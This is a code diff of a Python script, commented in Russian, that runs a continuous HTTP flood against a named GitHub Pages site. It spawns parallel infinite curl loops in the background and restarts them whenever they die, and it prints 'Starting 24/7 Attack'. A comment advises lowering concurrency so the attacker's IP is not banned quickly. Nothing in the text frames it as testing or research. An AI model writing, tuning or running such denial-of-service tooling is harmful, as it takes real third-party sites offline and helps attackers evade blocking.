@@ -4,11 +4,11 @@ import sys
 import os
 
 TARGET = "https://srabakio.github.io/"
-CONCURRENCY = 100  # Количество параллельных потоков curl
-CHECK_INTERVAL = 60 # Проверять доступность сайта раз в минуту
+CONCURRENCY = 50  # Начни с малого, чтобы не забанили IP сразу
+CHECK_INTERVAL = 60
 
 def run_attack():
-    """Запускает поток запросов"""
+    """Запускает curl в фоне"""
     cmd = f"""
     for i in $(seq 1 {CONCURRENCY}); do
         while true; do
@@ -18,6 +18,7 @@ def run_attack():
     wait
     """
     try:
+        # Запускаем как фоновый процесс внутри Python
         process = subprocess.Popen(
             ["bash", "-c", cmd],
             stdout=subprocess.DEVNULL,
@@ -30,24 +31,19 @@ def run_attack():
 
 def main():
     print("[*] Starting 24/7 Attack on", TARGET)
-    print(f"[*] Threads: {CONCURRENCY}")
-    
     process = None
     
     while True:
         try:
-            # Если процесс не запущен или умер, перезапускаем
+            # Если процесс умер или его нет
             if process is None or process.poll() is not None:
-                print("[*] Process died or not started. Restarting...")
+                print("[*] Process died. Restarting...")
                 process = run_attack()
                 if process:
                     print("[*] Attack process restarted.")
             
-            # Раз в минуту проверяем статус (опционально, можно убрать для экономии CPU)
+            # Ждем минуту перед следующей проверкой
             time.sleep(CHECK_INTERVAL)
-            
-            # Принудительный выход по сигналу (если Render убивает процесс)
-            # Но мы стараемся выживать
             
         except KeyboardInterrupt:
             print("\n[*] Stopping manually...")
@@ -55,8 +51,3 @@ def main():
                 process.terminate()
             break
         except Exception as e:
-            print(f"[!] Unexpected error: {e}")
-            time.sleep(5)
-
-if __name__ == "__main__":
-    main()
